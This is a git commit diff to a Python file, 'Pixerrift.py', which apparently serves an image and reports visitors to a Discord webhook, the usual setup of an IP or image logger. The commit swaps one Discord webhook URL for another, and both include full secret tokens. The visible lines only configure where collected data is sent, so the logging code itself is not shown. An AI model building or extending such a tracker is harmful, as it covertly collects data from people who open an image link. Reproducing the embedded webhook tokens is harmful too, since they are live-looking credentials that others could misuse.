709b18f288355325c894d8877874e17da3728e57
randy8534 <randydiscord94@gmail.com>
2026-06-21 16:17:28 +0300

    Update Pixerrift.py

--- api/Pixerrift.py
+++ api/Pixerrift.py
@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://canary.discord.com/api/webhooks/1518243100772925490/6NnmSG_leVAMbm9MClar2VEryxeIMdet6a06sq_tNKkF0B0x9A4kM2HaEVua-HN4Jhl0'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
